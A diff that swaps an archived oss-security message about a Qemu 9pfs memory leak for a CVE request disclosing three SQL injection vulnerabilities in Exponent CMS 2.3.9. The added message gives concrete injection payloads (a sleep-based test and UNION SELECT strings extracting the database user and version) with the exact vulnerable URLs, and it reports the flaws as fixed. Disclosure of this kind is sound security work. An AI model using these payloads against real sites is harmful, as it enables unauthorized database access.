@@ -1,33 +1,52 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/10/28/3
-Message-ID: <alpine.LFD.2.20.1610281505100.17055@wniryva>
-Date: Fri, 28 Oct 2016 15:06:26 +0530 (IST)
-From: P J P <ppandit@...hat.com>
-To: oss security list <oss-security@...ts.openwall.com>
-cc: Li Qiang <liqiang6-s@....cn>
-Subject: CVE request Qemu: memory leakage in v9fs_link
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/18/2
+Message-ID: <CAEiFw0VXVgWtKP3cT6SzKgrWSrs5N_3f2HXFoWhx=fi2Qm24vg@mail.gmail.com>
+Date: Sun, 18 Sep 2016 12:09:04 +0800
+From: felix k3y <felixk3y@...il.com>
+To: oss-security@...ts.openwall.com
+Subject: CVE request：Exponent CMS 2.3.9 SQL injection vulnerabilities
 Content-Type: text/plain; charset=utf-8
 
-   Hello,
+Hi, I reported the following SQL Injection vulnerabilities to the
+ExponentCMS team on Sep 13, 2016:
 
-Quick Emulator(Qemu) built with the VirtFS, host directory sharing via Plan 9 
-File System(9pfs) support, is vulnerable to a memory leakage issue. It could 
-occur when calling v9fs_link call.
+1)
+https://github.com/exponentcms/exponent-cms/blob/master/framework/modules/addressbook/controllers/addressController.php#L166-L175
 
-A privileged user inside guest could use this flaw to leak the host memory 
-bytes resulting in DoS for other services.
+2)
+https://github.com/exponentcms/exponent-cms/blob/master/framework/modules/blog/controllers/blogController.php#L192-L195
 
-Upstream patches:
------------------
-   -> https://lists.gnu.org/archive/html/qemu-devel/2016-10/msg02608.html
+3)
+https://github.com/exponentcms/exponent-cms/blob/master/framework/modules/core/controllers/expCommentController.php#L129-L134
 
-Reference:
-----------
-   -> http://wiki.qemu.org/Documentation/9psetup
 
-This issue was reported by Li Qiang of 360.cn Inc.
+/index.php?controller=address&action=activate_address
+In the first case, you can sending "id=1 and if(1,sleep(1),0)%23" in the
+POST data of an HTTP request;
 
-Thank you.
---
-Prasad J Pandit / Red Hat Product Security Team
-47AF CE69 3A90 54AA 9045 1053 DD13 3D32 FE5B 041F
+/index.php?controller=blog&action=show&title=xx' union select
+1,user(),3,4,5,6,7,8,9,0,11,2,3,4,5,6,7,8,9,0%23
+In the second, you can sending "title=xx' union select
+1,user(),3,4,5,6,7,8,9,0,11,2,3,4,5,6,7,8,9,0%23" in the GET data of an
+HTTP request;
+
+/index.php?controller=expComment&action=showComments&content_id=11%20union%20select%201,2,3,4,version(),6,7,8,9,10,11--%20s&config[disable_nested_comments]=1
+In the last one , you can sending
+"content_id=11%20union%20select%201,2,3,4,version(),6,7,8,9,10,11--%20s" in
+the GET data of an HTTP request.
+
+
+
+And Now, all SQL Injection vulnerabilityies have been fixed.
+
+https://exponentcms.lighthouseapp.com/projects/61783/changesets/e916702a91a6342bbab483a2be2ba2f11dca3aa3
+https://github.com/exponentcms/exponent-cms/commit/e916702a91a6342bbab483a2be2ba2f11dca3aa3
+
+I would like to request CVEs for those issues (if not done so).
+
+thx.
+--------------------------------------
+felixk3y#gmail.com
+penghua#silence.com.cn
+PKAV Team
+
